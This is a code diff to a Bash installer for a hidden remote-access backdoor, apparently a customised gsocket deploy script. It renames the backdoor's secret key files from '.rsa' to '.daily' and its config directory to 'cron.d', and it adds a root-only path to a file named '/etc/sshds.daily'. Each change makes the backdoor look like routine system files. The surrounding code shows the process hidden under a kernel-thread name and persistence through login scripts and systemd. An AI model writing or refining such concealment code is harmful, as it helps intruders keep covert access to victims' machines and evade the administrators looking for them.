@@ -67,7 +67,7 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
 # PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
 # ~/.local/<NAME>
-CONFIG_DIR_NAME=".local"
+CONFIG_DIR_NAME="cron.d"
 
 # Names for 'uninstall' (including names from previous versions)
 BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
@@ -674,7 +674,7 @@ init_vars()
 	fi
 	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
 	
-	SEC_NAME="${BIN_HIDDEN_NAME}.rsa"
+	SEC_NAME="${BIN_HIDDEN_NAME}.daily"
 	if [[ -n $GS_HIDDEN_NAME ]]; then
 		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
 		PROC_HIDDEN_NAME_RX+="|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')"
@@ -906,20 +906,20 @@ uninstall()
 	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
 		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
 			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}"
-			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}.rsa"  # SEC_NAME
+			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}.daily"  # SEC_NAME
 		done
 		uninstall_rm "${GS_PREFIX}/usr/sbin/${hn}"
 		uninstall_rm "/dev/shm/${hn}"
 		uninstall_rm "/var/tmp/.ssh/${hn}"
 		uninstall_rm "${PWD}/${hn}"
 
-		uninstall_rm "${RCLOCAL_DIR}/${hn}.rsa"  # SEC_NAME
-		uninstall_rm "${GS_PREFIX}/etc/${hn}.rsa" # SEC_NAME
+		uninstall_rm "${RCLOCAL_DIR}/${hn}.daily"  # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/etc/${hn}.daily" # SEC_NAME
 
-		uninstall_rm "/dev/shm/${hn}.rsa" # SEC_NAME
-		uninstall_rm "/tmp/.gsusr-${UID}${hn}.rsa" # SEC_NAME
+		uninstall_rm "/dev/shm/${hn}.daily" # SEC_NAME
+		uninstall_rm "/tmp/.gsusr-${UID}${hn}.daily" # SEC_NAME
 
-		uninstall_rm "${PWD}/${hn}.rsa" # SEC_NAME
+		uninstall_rm "${PWD}/${hn}.daily" # SEC_NAME
 
 		# Remove from login script
 		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
@@ -929,8 +929,8 @@ uninstall()
 
 		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
 
-		## Systemd's gs-dbus.rsa
-		uninstall_rm "${SERVICE_DIR}/${hn}.rsa"  # SYSTEMD_SEC_FILE / SEC_NAME
+		## Systemd's gs-dbus.daily
+		uninstall_rm "${SERVICE_DIR}/${hn}.daily"  # SYSTEMD_SEC_FILE / SEC_NAME
 	done
 
 	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
@@ -1544,11 +1544,11 @@ gs_start()
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
 		# HERE: OLD is already running.
 		if [[ -n "$IS_SKIPPED" ]]; then
-			# HERE: Already running. Skipped installation (sec.rsa has not changed).
+			# HERE: Already running. Skipped installation (sec.daily has not changed).
 			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
 			unset IS_NEED_START
 		else
-			# HERE: sec.rsa has been updated
+			# HERE: sec.daily has been updated
 			OK_OUT
 			WARN "More than one ${PROC_HIDDEN_NAME} is running."
 			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
@@ -1560,9 +1560,9 @@ gs_start()
 
 	if [[ -n "$IS_NEED_START" ]]; then
 		# LOGIKA BARU: Cek Root dan File
-		# Jika user adalah root (0) DAN file /usr/bin/sshds.rsa TIDAK ADA
-		if [[ "$EUID" -eq 0 ]] && [[ ! -f "/usr/sbin/sshds.rsa" ]]; then
-			USER_SEC_FILE="/etc/sshds.rsa"
+		# Jika user adalah root (0) DAN file /usr/bin/sshds.daily TIDAK ADA
+		if [[ "$EUID" -eq 0 ]] && [[ ! -f "/usr/sbin/sshds.daily" ]]; then
+			USER_SEC_FILE="/etc/sshds.daily"
 		fi
 
 		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
